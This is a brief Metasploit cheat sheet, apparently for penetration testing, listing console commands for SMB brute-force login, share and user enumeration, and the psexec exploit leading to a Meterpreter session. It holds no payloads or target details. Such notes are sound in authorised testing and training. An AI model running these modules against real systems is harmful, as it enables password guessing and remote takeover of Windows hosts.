```bash
msf> use scanner/smb/smb_login # dict attack
msf> use scanner/smb/pipe_auditor
msf> use exploit/windows/smb/psexec # meterpreter po zalogowaniu
msf> use auxiliary/scanner/smb/smb_enumshares
msf> use auxiliary/scanner/smb/smb_enumusers
msf> use auxiliary/scanner/smb/smb_enumusers_domain